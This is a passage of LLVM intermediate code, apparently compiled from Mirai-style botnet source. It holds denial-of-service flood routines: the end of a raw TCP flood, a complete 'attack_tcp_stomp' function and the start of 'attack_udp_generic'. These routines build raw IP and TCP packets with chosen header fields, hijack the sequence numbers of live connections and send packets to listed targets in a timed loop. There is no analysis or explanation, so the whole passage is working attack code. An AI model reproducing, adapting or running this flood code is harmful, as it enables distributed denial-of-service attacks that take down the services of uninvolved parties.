  %66 = shl i16 %33, 9
  %67 = and i16 %66, 512
  %68 = shl i16 %35, 8
  %69 = and i16 %68, 256
  %70 = or i16 %58, %60
  %71 = or i16 %70, %63
  %72 = or i16 %71, %65
  %.masked = or i16 %72, %67
  %73 = or i16 %.masked, %69
  %74 = icmp eq i8 %29, 0
  br label %95

; <label>:75:                                     ; preds = %46
  %76 = call i32 @close(i32 %44) #10
  br label %.loopexit

.preheader.loopexit:                              ; preds = %142
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit, %.preheader134
  %77 = icmp eq i8 %1, 0
  %sext = shl i64 %43, 32
  %78 = ashr exact i64 %sext, 32
  %79 = icmp eq i32 %40, -1
  %80 = and i32 %12, 65535
  %81 = icmp eq i32 %80, 65535
  %82 = and i32 %18, 65535
  %83 = icmp eq i32 %82, 65535
  %84 = and i32 %20, 65535
  %85 = icmp eq i32 %84, 65535
  %86 = icmp eq i32 %22, 65535
  %87 = icmp eq i32 %23, 65535
  %88 = icmp eq i8 %38, 0
  %89 = sext i32 %36 to i64
  %90 = add nsw i64 %89, 20
  %91 = trunc i64 %90 to i16
  %92 = trunc i64 %90 to i32
  %93 = add nsw i64 %89, 40
  %94 = sext i32 %36 to i64
  br label %147

; <label>:95:                                     ; preds = %.lr.ph136, %142
  %96 = call noalias i8* @calloc(i64 1510, i64 1) #10
  %97 = load i32, i32* %6, align 4
  %98 = sext i32 %97 to i64
  %99 = getelementptr inbounds i8*, i8** %9, i64 %98
  store i8* %96, i8** %99, align 8
  %100 = getelementptr inbounds i8, i8* %96, i64 20
  %101 = getelementptr inbounds i8, i8* %96, i64 40
  store i8 69, i8* %96, align 4
  %102 = getelementptr inbounds i8, i8* %96, i64 1
  store i8 %11, i8* %102, align 1
  %103 = call zeroext i16 @htons(i16 zeroext %54) #11
  %104 = getelementptr inbounds i8, i8* %96, i64 2
  %105 = bitcast i8* %104 to i16*
  store i16 %103, i16* %105, align 2
  %106 = call zeroext i16 @htons(i16 zeroext %13) #11
  %107 = getelementptr inbounds i8, i8* %96, i64 4
  %108 = bitcast i8* %107 to i16*
  store i16 %106, i16* %108, align 4
  %109 = getelementptr inbounds i8, i8* %96, i64 8
  store i8 %15, i8* %109, align 4
  br i1 %55, label %114, label %110

; <label>:110:                                    ; preds = %95
  %111 = call zeroext i16 @htons(i16 zeroext 16384) #11
  %112 = getelementptr inbounds i8, i8* %96, i64 6
  %113 = bitcast i8* %112 to i16*
  store i16 %111, i16* %113, align 2
  br label %114

; <label>:114:                                    ; preds = %95, %110
  %115 = getelementptr inbounds i8, i8* %96, i64 9
  store i8 6, i8* %115, align 1
  %116 = getelementptr inbounds i8, i8* %96, i64 12
  %117 = bitcast i8* %116 to i32*
  store i32 %40, i32* %117, align 4
  %118 = load i32, i32* %6, align 4
  %119 = sext i32 %118 to i64
  %120 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %119, i32 1
  %121 = load i32, i32* %120, align 4
  %122 = getelementptr inbounds i8, i8* %96, i64 16
  %123 = bitcast i8* %122 to i32*
  store i32 %121, i32* %123, align 4
  %124 = call zeroext i16 @htons(i16 zeroext %19) #11
  %125 = bitcast i8* %100 to i16*
  store i16 %124, i16* %125, align 4
  %126 = call zeroext i16 @htons(i16 zeroext %21) #11
  %127 = getelementptr inbounds i8, i8* %96, i64 22
  %128 = bitcast i8* %127 to i16*
  store i16 %126, i16* %128, align 2
  %129 = call zeroext i16 @htons(i16 zeroext %56) #11
  %130 = zext i16 %129 to i32
  %131 = getelementptr inbounds i8, i8* %96, i64 24
  %132 = bitcast i8* %131 to i32*
  store i32 %130, i32* %132, align 4
  %133 = getelementptr inbounds i8, i8* %96, i64 32
  %134 = bitcast i8* %133 to i16*
  %135 = load i16, i16* %134, align 4
  %136 = and i16 %135, -16369
  %137 = or i16 %73, %136
  %138 = or i16 %137, 80
  store i16 %138, i16* %134, align 4
  br i1 %74, label %142, label %139

; <label>:139:                                    ; preds = %114
  %140 = load i16, i16* %134, align 4
  %141 = or i16 %140, 2048
  store i16 %141, i16* %134, align 4
  br label %142

; <label>:142:                                    ; preds = %114, %139
  call void @rand_alphastr(i8* nonnull %101, i32 %36)
  %143 = getelementptr inbounds i8, i8* %101, i64 %52
  store i8 0, i8* %143, align 1
  %144 = load i32, i32* %6, align 4
  %145 = add nsw i32 %144, 1
  store i32 %145, i32* %6, align 4
  %146 = icmp slt i32 %145, %50
  br i1 %146, label %95, label %.preheader.loopexit

; <label>:147:                                    ; preds = %.preheader, %._crit_edge
  store i32 0, i32* %6, align 4
  br i1 %77, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %147
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %190
  %storemerge127135 = phi i32 [ %209, %190 ], [ 0, %.lr.ph.preheader ]
  %148 = sext i32 %storemerge127135 to i64
  %149 = getelementptr inbounds i8*, i8** %9, i64 %148
  %150 = load i8*, i8** %149, align 8
  %151 = bitcast i8* %150 to %struct.iphdr*
  %152 = getelementptr inbounds i8, i8* %150, i64 20
  %153 = getelementptr inbounds i8, i8* %150, i64 40
  %154 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %148, i32 2
  %155 = load i8, i8* %154, align 4
  %156 = icmp ult i8 %155, 32
  br i1 %156, label %157, label %164

; <label>:157:                                    ; preds = %.lr.ph
  %158 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %148, i32 1
  %159 = load i32, i32* %158, align 4
  %160 = call i32 @ntohl(i32 %159) #11
  %161 = call i32 @htonl(i32 %160) #11
  %162 = getelementptr inbounds i8, i8* %150, i64 16
  %163 = bitcast i8* %162 to i32*
  store i32 %161, i32* %163, align 4
  br label %164

; <label>:164:                                    ; preds = %157, %.lr.ph
  br i1 %79, label %165, label %168

; <label>:165:                                    ; preds = %164
  %166 = getelementptr inbounds i8, i8* %150, i64 12
  %167 = bitcast i8* %166 to i32*
  store i32 0, i32* %167, align 4
  br label %168

; <label>:168:                                    ; preds = %165, %164
  br i1 %81, label %169, label %172

; <label>:169:                                    ; preds = %168
  %170 = getelementptr inbounds i8, i8* %150, i64 4
  %171 = bitcast i8* %170 to i16*
  store i16 0, i16* %171, align 4
  br label %172

; <label>:172:                                    ; preds = %169, %168
  br i1 %83, label %173, label %175

; <label>:173:                                    ; preds = %172
  %174 = bitcast i8* %152 to i16*
  store i16 0, i16* %174, align 4
  br label %175

; <label>:175:                                    ; preds = %173, %172
  br i1 %85, label %176, label %179

; <label>:176:                                    ; preds = %175
  %177 = getelementptr inbounds i8, i8* %150, i64 22
  %178 = bitcast i8* %177 to i16*
  store i16 0, i16* %178, align 2
  br label %179

; <label>:179:                                    ; preds = %176, %175
  br i1 %86, label %180, label %183

; <label>:180:                                    ; preds = %179
  %181 = getelementptr inbounds i8, i8* %150, i64 24
  %182 = bitcast i8* %181 to i32*
  store i32 0, i32* %182, align 4
  br label %183

; <label>:183:                                    ; preds = %180, %179
  br i1 %87, label %184, label %187

; <label>:184:                                    ; preds = %183
  %185 = getelementptr inbounds i8, i8* %150, i64 28
  %186 = bitcast i8* %185 to i32*
  store i32 0, i32* %186, align 4
  br label %187

; <label>:187:                                    ; preds = %184, %183
  br i1 %88, label %190, label %188

; <label>:188:                                    ; preds = %187
  call void @rand_alphastr(i8* %153, i32 %36)
  %189 = getelementptr inbounds i8, i8* %153, i64 %94
  store i8 0, i8* %189, align 1
  br label %190

; <label>:190:                                    ; preds = %187, %188
  %191 = getelementptr inbounds i8, i8* %150, i64 10
  %192 = bitcast i8* %191 to i16*
  store i16 0, i16* %192, align 2
  %193 = bitcast i8* %150 to i16*
  %194 = call zeroext i16 @checksum_generic(i16* %193, i32 20)
  store i16 %194, i16* %192, align 2
  %195 = getelementptr inbounds i8, i8* %150, i64 36
  %196 = bitcast i8* %195 to i16*
  store i16 0, i16* %196, align 4
  %197 = call zeroext i16 @htons(i16 zeroext %91) #11
  %198 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %151, i8* %152, i16 zeroext %197, i32 %92)
  store i16 %198, i16* %196, align 4
  %199 = getelementptr inbounds i8, i8* %150, i64 22
  %200 = bitcast i8* %199 to i16*
  %201 = load i16, i16* %200, align 2
  %202 = load i32, i32* %6, align 4
  %203 = sext i32 %202 to i64
  %204 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %203, i32 0, i32 1
  store i16 %201, i16* %204, align 2
  %205 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %203, i32 0
  %206 = bitcast %struct.sockaddr_in* %205 to %struct.sockaddr*
  %207 = call i64 @sendto(i32 %44, i8* %150, i64 %93, i32 16384, %struct.sockaddr* %206, i32 16) #10
  %208 = load i32, i32* %6, align 4
  %209 = add nsw i32 %208, 1
  store i32 %209, i32* %6, align 4
  %210 = icmp slt i32 %209, %50
  br i1 %210, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %190
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %147
  %211 = call i64 @time(i64* null) #10
  %212 = icmp sgt i64 %211, %78
  br i1 %212, label %.loopexit.loopexit, label %147

.loopexit.loopexit:                               ; preds = %._crit_edge
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %5, %75
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_tcp_stomp(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %6 = alloca i32, align 4
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca %struct.sockaddr_in, align 4
  %9 = alloca i32, align 4
  %10 = alloca [256 x i8], align 16
  store i32 0, i32* %6, align 4
  %11 = zext i8 %1 to i64
  %12 = tail call noalias i8* @calloc(i64 %11, i64 16) #10
  %13 = bitcast i8* %12 to %struct.attack_stomp_data*
  %14 = tail call noalias i8* @calloc(i64 %11, i64 8) #10
  %15 = bitcast i8* %14 to i8**
  %16 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 2, i32 0)
  %17 = trunc i32 %16 to i8
  %18 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 3, i32 65535)
  %19 = trunc i32 %18 to i16
  %20 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 4, i32 64)
  %21 = trunc i32 %20 to i8
  %22 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 5, i32 1)
  %23 = trunc i32 %22 to i8
  %24 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 7, i32 65535)
  %25 = trunc i32 %24 to i16
  %26 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 10, i32 0)
  %27 = trunc i32 %26 to i16
  %28 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 11, i32 1)
  %29 = trunc i32 %28 to i16
  %30 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 12, i32 1)
  %31 = trunc i32 %30 to i16
  %32 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 13, i32 0)
  %33 = trunc i32 %32 to i16
  %34 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 14, i32 0)
  %35 = trunc i32 %34 to i16
  %36 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 15, i32 0)
  %37 = trunc i32 %36 to i16
  %38 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 0, i32 768)
  %39 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 1, i32 1)
  %40 = trunc i32 %39 to i8
  %41 = tail call i64 @time(i64* null) #10
  %42 = zext i32 %0 to i64
  %43 = add i64 %41, %42
  %44 = tail call i32 @socket(i32 2, i32 3, i32 6) #10
  %45 = icmp eq i32 %44, -1
  br i1 %45, label %.loopexit, label %46

; <label>:46:                                     ; preds = %5
  store i32 1, i32* %6, align 4
  %47 = bitcast i32* %6 to i8*
  %48 = call i32 @setsockopt(i32 %44, i32 0, i32 3, i8* nonnull %47, i32 4) #10
  %49 = icmp eq i32 %48, -1
  br i1 %49, label %85, label %.preheader160

.preheader160:                                    ; preds = %46
  store i32 0, i32* %6, align 4
  %50 = zext i8 %1 to i32
  %51 = icmp eq i8 %1, 0
  br i1 %51, label %.preheader, label %.preheader158.lr.ph

.preheader158.lr.ph:                              ; preds = %.preheader160
  %52 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 0
  %53 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 2, i32 0
  %54 = and i32 %24, 65535
  %55 = icmp eq i32 %54, 65535
  %56 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 1
  %57 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %58 = getelementptr inbounds [256 x i8], [256 x i8]* %10, i64 0, i64 0
  %59 = bitcast %struct.sockaddr_in* %8 to %struct.sockaddr*
  %60 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i64 0, i32 2, i32 0
  %61 = getelementptr inbounds [256 x i8], [256 x i8]* %10, i64 0, i64 20
  %62 = bitcast i8* %61 to i16*
  %63 = getelementptr inbounds [256 x i8], [256 x i8]* %10, i64 0, i64 32
  %64 = bitcast i8* %63 to i16*
  %65 = sext i32 %38 to i64
  %66 = add nsw i64 %65, 40
  %67 = trunc i64 %66 to i16
  %68 = icmp eq i8 %23, 0
  %69 = shl i16 %27, 13
  %70 = and i16 %69, 8192
  %71 = shl i16 %29, 12
  %72 = and i16 %71, 4096
  %73 = shl i16 %31, 11
  %74 = and i16 %73, 2048
  %75 = shl i16 %33, 10
  %76 = and i16 %75, 1024
  %77 = shl i16 %35, 9
  %78 = and i16 %77, 512
  %79 = shl i16 %37, 8
  %80 = and i16 %79, 256
  %81 = or i16 %72, %70
  %82 = or i16 %81, %74
  %83 = or i16 %82, %76
  %.masked = or i16 %83, %78
  %84 = or i16 %.masked, %80
  br label %.preheader158

; <label>:85:                                     ; preds = %46
  %86 = call i32 @close(i32 %44) #10
  br label %.loopexit

.preheader158:                                    ; preds = %.preheader158.lr.ph, %.loopexit159
  %.0169 = phi %struct.tcphdr* [ undef, %.preheader158.lr.ph ], [ %.1, %.loopexit159 ]
  %87 = call i32 @socket(i32 2, i32 1, i32 0) #10
  %88 = icmp eq i32 %87, -1
  br i1 %88, label %.loopexit159, label %.lr.ph168.preheader

.lr.ph168.preheader:                              ; preds = %.preheader158
  br label %.lr.ph168

.preheader.loopexit:                              ; preds = %.loopexit159
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit, %.preheader160
  %89 = icmp eq i8 %1, 0
  %sext = shl i64 %43, 32
  %90 = ashr exact i64 %sext, 32
  %91 = and i32 %18, 65535
  %92 = icmp eq i32 %91, 65535
  %93 = icmp eq i8 %40, 0
  %94 = sext i32 %38 to i64
  %95 = add nsw i64 %94, 20
  %96 = trunc i64 %95 to i16
  %97 = trunc i64 %95 to i32
  %98 = add nsw i64 %94, 40
  %99 = sext i32 %38 to i64
  br label %236

.lr.ph168:                                        ; preds = %.lr.ph168.preheader, %.backedge
  %100 = phi i32 [ %225, %.backedge ], [ %87, %.lr.ph168.preheader ]
  %101 = call i32 (i32, i32, ...) @fcntl(i32 %100, i32 3, i32 0) #10
  %102 = or i32 %101, 2048
  %103 = call i32 (i32, i32, ...) @fcntl(i32 %100, i32 4, i32 %102) #10
  store i16 2, i16* %52, align 4
  %104 = load i32, i32* %6, align 4
  %105 = sext i32 %104 to i64
  %106 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %105, i32 2
  %107 = load i8, i8* %106, align 4
  %108 = icmp ult i8 %107, 32
  %109 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %105, i32 1
  %110 = load i32, i32* %109, align 4
  br i1 %108, label %111, label %114

; <label>:111:                                    ; preds = %.lr.ph168
  %112 = call i32 @ntohl(i32 %110) #11
  %113 = call i32 @htonl(i32 %112) #11
  br label %114

; <label>:114:                                    ; preds = %.lr.ph168, %111
  %.sink = phi i32 [ %113, %111 ], [ %110, %.lr.ph168 ]
  store i32 %.sink, i32* %53, align 4
  br i1 %55, label %117, label %115

; <label>:115:                                    ; preds = %114
  %116 = call zeroext i16 @htons(i16 zeroext %25) #11
  br label %117

; <label>:117:                                    ; preds = %114, %115
  %.sink3 = phi i16 [ %116, %115 ], [ 0, %114 ]
  store i16 %.sink3, i16* %56, align 2
  %118 = call i32 @connect(i32 %100, %struct.sockaddr* nonnull %57, i32 16) #10
  %119 = call i64 @time(i64* null) #10
  br label %120

; <label>:120:                                    ; preds = %227, %117
  store i32 16, i32* %9, align 4
  %121 = call i64 @recvfrom(i32 %44, i8* nonnull %58, i64 256, i32 16384, %struct.sockaddr* nonnull %59, i32* nonnull %9) #10
  %122 = trunc i64 %121 to i32
  %123 = icmp eq i32 %122, -1
  br i1 %123, label %.loopexit.loopexit179, label %124

; <label>:124:                                    ; preds = %120
  %125 = load i32, i32* %60, align 4
  %126 = load i32, i32* %53, align 4
  %127 = icmp eq i32 %125, %126
  br i1 %127, label %128, label %227

; <label>:128:                                    ; preds = %124
  %sext146 = shl i64 %121, 32
  %129 = ashr exact i64 %sext146, 32
  %130 = icmp ugt i64 %129, 40
  br i1 %130, label %131, label %227

; <label>:131:                                    ; preds = %128
  %132 = load i16, i16* %62, align 4
  %133 = load i16, i16* %56, align 2
  %134 = icmp eq i16 %132, %133
  br i1 %134, label %135, label %227

; <label>:135:                                    ; preds = %131
  %136 = load i16, i16* %64, align 16
  %137 = and i16 %136, 4608
  %138 = icmp eq i16 %137, 4608
  br i1 %138, label %139, label %220

; <label>:139:                                    ; preds = %135
  %140 = load i32, i32* %6, align 4
  %141 = sext i32 %140 to i64
  %142 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %13, i64 %141, i32 0
  store i32 %126, i32* %142, align 4
  %143 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %.0169, i64 0, i32 2
  %144 = load i32, i32* %143, align 4
  %145 = call i32 @ntohl(i32 %144) #11
  %146 = load i32, i32* %6, align 4
  %147 = sext i32 %146 to i64
  %148 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %13, i64 %147, i32 1
  store i32 %145, i32* %148, align 4
  %149 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %.0169, i64 0, i32 3
  %150 = load i32, i32* %149, align 4
  %151 = call i32 @ntohl(i32 %150) #11
  %152 = load i32, i32* %6, align 4
  %153 = sext i32 %152 to i64
  %154 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %13, i64 %153, i32 2
  store i32 %151, i32* %154, align 4
  %155 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %.0169, i64 0, i32 1
  %156 = load i16, i16* %155, align 2
  %157 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %13, i64 %153, i32 3
  store i16 %156, i16* %157, align 4
  %158 = load i16, i16* %56, align 2
  %159 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %13, i64 %153, i32 4
  store i16 %158, i16* %159, align 2
  %160 = call noalias i8* @malloc(i64 %66) #10
  %161 = load i32, i32* %6, align 4
  %162 = sext i32 %161 to i64
  %163 = getelementptr inbounds i8*, i8** %15, i64 %162
  store i8* %160, i8** %163, align 8
  %164 = getelementptr inbounds i8, i8* %160, i64 20
  %165 = bitcast i8* %164 to %struct.tcphdr*
  %166 = getelementptr inbounds i8, i8* %160, i64 40
  store i8 69, i8* %160, align 4
  %167 = getelementptr inbounds i8, i8* %160, i64 1
  store i8 %17, i8* %167, align 1
  %168 = call zeroext i16 @htons(i16 zeroext %67) #11
  %169 = getelementptr inbounds i8, i8* %160, i64 2
  %170 = bitcast i8* %169 to i16*
  store i16 %168, i16* %170, align 2
  %171 = call zeroext i16 @htons(i16 zeroext %19) #11
  %172 = getelementptr inbounds i8, i8* %160, i64 4
  %173 = bitcast i8* %172 to i16*
  store i16 %171, i16* %173, align 4
  %174 = getelementptr inbounds i8, i8* %160, i64 8
  store i8 %21, i8* %174, align 4
  br i1 %68, label %179, label %175

; <label>:175:                                    ; preds = %139
  %176 = call zeroext i16 @htons(i16 zeroext 16384) #11
  %177 = getelementptr inbounds i8, i8* %160, i64 6
  %178 = bitcast i8* %177 to i16*
  store i16 %176, i16* %178, align 2
  br label %179

; <label>:179:                                    ; preds = %139, %175
  %180 = getelementptr inbounds i8, i8* %160, i64 9
  store i8 6, i8* %180, align 1
  %181 = load i32, i32* @LOCAL_ADDR, align 4
  %182 = getelementptr inbounds i8, i8* %160, i64 12
  %183 = bitcast i8* %182 to i32*
  store i32 %181, i32* %183, align 4
  %184 = load i32, i32* %6, align 4
  %185 = sext i32 %184 to i64
  %186 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %13, i64 %185, i32 0
  %187 = load i32, i32* %186, align 4
  %188 = getelementptr inbounds i8, i8* %160, i64 16
  %189 = bitcast i8* %188 to i32*
  store i32 %187, i32* %189, align 4
  %190 = load i32, i32* %6, align 4
  %191 = sext i32 %190 to i64
  %192 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %13, i64 %191, i32 3
  %193 = load i16, i16* %192, align 4
  %194 = bitcast i8* %164 to i16*
  store i16 %193, i16* %194, align 4
  %195 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %13, i64 %191, i32 4
  %196 = load i16, i16* %195, align 2
  %197 = getelementptr inbounds i8, i8* %160, i64 22
  %198 = bitcast i8* %197 to i16*
  store i16 %196, i16* %198, align 2
  %199 = load i32, i32* %6, align 4
  %200 = sext i32 %199 to i64
  %201 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %13, i64 %200, i32 2
  %202 = load i32, i32* %201, align 4
  %203 = getelementptr inbounds i8, i8* %160, i64 24
  %204 = bitcast i8* %203 to i32*
  store i32 %202, i32* %204, align 4
  %205 = load i32, i32* %6, align 4
  %206 = sext i32 %205 to i64
  %207 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %13, i64 %206, i32 1
  %208 = load i32, i32* %207, align 4
  %209 = getelementptr inbounds i8, i8* %160, i64 28
  %210 = bitcast i8* %209 to i32*
  store i32 %208, i32* %210, align 4
  %211 = getelementptr inbounds i8, i8* %160, i64 32
  %212 = bitcast i8* %211 to i16*
  %213 = load i16, i16* %212, align 4
  %214 = getelementptr inbounds i8, i8* %160, i64 34
  %215 = bitcast i8* %214 to i16*
  store i16 0, i16* %215, align 2
  %216 = and i16 %213, -16369
  %217 = or i16 %216, 128
  %218 = or i16 %84, %217
  store i16 %218, i16* %212, align 4
  call void @rand_alphastr(i8* %166, i32 %38)
  %219 = getelementptr inbounds i8, i8* %166, i64 %65
  store i8 0, i8* %219, align 1
  br label %.loopexit159

; <label>:220:                                    ; preds = %135
  %221 = and i16 %136, 1280
  %222 = icmp eq i16 %221, 0
  br i1 %222, label %227, label %223

; <label>:223:                                    ; preds = %220
  %224 = call i32 @close(i32 %100) #10
  br label %.backedge

.backedge:                                        ; preds = %223, %231
  %225 = call i32 @socket(i32 2, i32 1, i32 0) #10
  %226 = icmp eq i32 %225, -1
  br i1 %226, label %.loopexit159.loopexit, label %.lr.ph168

; <label>:227:                                    ; preds = %220, %131, %128, %124
  %228 = call i64 @time(i64* null) #10
  %229 = sub nsw i64 %228, %119
  %230 = icmp sgt i64 %229, 10
  br i1 %230, label %231, label %120

; <label>:231:                                    ; preds = %227
  %232 = call i32 @close(i32 %100) #10
  br label %.backedge

.loopexit159.loopexit:                            ; preds = %.backedge
  br label %.loopexit159

.loopexit159:                                     ; preds = %.loopexit159.loopexit, %.preheader158, %179
  %.1 = phi %struct.tcphdr* [ %165, %179 ], [ %.0169, %.preheader158 ], [ %.0169, %.loopexit159.loopexit ]
  %233 = load i32, i32* %6, align 4
  %234 = add nsw i32 %233, 1
  store i32 %234, i32* %6, align 4
  %235 = icmp slt i32 %234, %50
  br i1 %235, label %.preheader158, label %.preheader.loopexit

; <label>:236:                                    ; preds = %.preheader, %._crit_edge
  store i32 0, i32* %6, align 4
  br i1 %89, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %236
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %249
  %storemerge145167 = phi i32 [ %287, %249 ], [ 0, %.lr.ph.preheader ]
  %237 = sext i32 %storemerge145167 to i64
  %238 = getelementptr inbounds i8*, i8** %15, i64 %237
  %239 = load i8*, i8** %238, align 8
  %240 = bitcast i8* %239 to %struct.iphdr*
  %241 = getelementptr inbounds i8, i8* %239, i64 20
  %242 = getelementptr inbounds i8, i8* %239, i64 40
  br i1 %92, label %243, label %246

; <label>:243:                                    ; preds = %.lr.ph
  %244 = getelementptr inbounds i8, i8* %239, i64 4
  %245 = bitcast i8* %244 to i16*
  store i16 0, i16* %245, align 4
  br label %246

; <label>:246:                                    ; preds = %243, %.lr.ph
  br i1 %93, label %249, label %247

; <label>:247:                                    ; preds = %246
  call void @rand_alphastr(i8* %242, i32 %38)
  %248 = getelementptr inbounds i8, i8* %242, i64 %99
  store i8 0, i8* %248, align 1
  br label %249

; <label>:249:                                    ; preds = %246, %247
  %250 = getelementptr inbounds i8, i8* %239, i64 10
  %251 = bitcast i8* %250 to i16*
  store i16 0, i16* %251, align 2
  %252 = bitcast i8* %239 to i16*
  %253 = call zeroext i16 @checksum_generic(i16* %252, i32 20)
  store i16 %253, i16* %251, align 2
  %254 = load i32, i32* %6, align 4
  %255 = sext i32 %254 to i64
  %256 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %13, i64 %255, i32 1
  %257 = load i32, i32* %256, align 4
  %258 = add i32 %257, 1
  store i32 %258, i32* %256, align 4
  %259 = trunc i32 %257 to i16
  %260 = call zeroext i16 @htons(i16 zeroext %259) #11
  %261 = zext i16 %260 to i32
  %262 = getelementptr inbounds i8, i8* %239, i64 24
  %263 = bitcast i8* %262 to i32*
  store i32 %261, i32* %263, align 4
  %264 = load i32, i32* %6, align 4
  %265 = sext i32 %264 to i64
  %266 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %13, i64 %265, i32 2
  %267 = load i32, i32* %266, align 4
  %268 = trunc i32 %267 to i16
  %269 = call zeroext i16 @htons(i16 zeroext %268) #11
  %270 = zext i16 %269 to i32
  %271 = getelementptr inbounds i8, i8* %239, i64 28
  %272 = bitcast i8* %271 to i32*
  store i32 %270, i32* %272, align 4
  %273 = getelementptr inbounds i8, i8* %239, i64 36
  %274 = bitcast i8* %273 to i16*
  store i16 0, i16* %274, align 4
  %275 = call zeroext i16 @htons(i16 zeroext %96) #11
  %276 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %240, i8* %241, i16 zeroext %275, i32 %97)
  store i16 %276, i16* %274, align 4
  %277 = getelementptr inbounds i8, i8* %239, i64 22
  %278 = bitcast i8* %277 to i16*
  %279 = load i16, i16* %278, align 2
  %280 = load i32, i32* %6, align 4
  %281 = sext i32 %280 to i64
  %282 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %281, i32 0, i32 1
  store i16 %279, i16* %282, align 2
  %283 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %281, i32 0
  %284 = bitcast %struct.sockaddr_in* %283 to %struct.sockaddr*
  %285 = call i64 @sendto(i32 %44, i8* %239, i64 %98, i32 16384, %struct.sockaddr* %284, i32 16) #10
  %286 = load i32, i32* %6, align 4
  %287 = add nsw i32 %286, 1
  store i32 %287, i32* %6, align 4
  %288 = icmp slt i32 %287, %50
  br i1 %288, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %249
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %236
  %289 = call i64 @time(i64* null) #10
  %290 = icmp sgt i64 %289, %90
  br i1 %290, label %.loopexit.loopexit, label %236

.loopexit.loopexit:                               ; preds = %._crit_edge
  br label %.loopexit

.loopexit.loopexit179:                            ; preds = %120
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit179, %.loopexit.loopexit, %5, %85
  ret void
}

declare i64 @recvfrom(i32, i8*, i64, i32, %struct.sockaddr*, i32*) local_unnamed_addr #3

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) local_unnamed_addr #1

; Function Attrs: noinline nounwind uwtable
define void @attack_udp_generic(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %6 = alloca i32, align 4
  store i32 0, i32* %6, align 4
  %7 = zext i8 %1 to i64
  %8 = tail call noalias i8* @calloc(i64 %7, i64 8) #10
  %9 = bitcast i8* %8 to i8**
  %10 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 2, i32 0)
  %11 = trunc i32 %10 to i8
  %12 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 3, i32 65535)
  %13 = trunc i32 %12 to i16
  %14 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 4, i32 64)
  %15 = trunc i32 %14 to i8
